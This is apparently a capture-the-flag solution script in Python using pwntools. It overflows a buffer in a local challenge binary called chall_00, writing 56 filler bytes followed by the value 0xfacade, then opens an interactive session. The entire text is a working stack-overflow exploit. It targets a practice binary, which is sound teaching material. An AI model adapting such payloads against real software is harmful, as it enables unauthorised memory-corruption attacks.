from pwn import *

p=process("./chall_00")

#gdb.attach(p)
payload=b"A"*56+pack(0xfacade,32)
print(payload)
p.sendline(payload)
p.interactive()
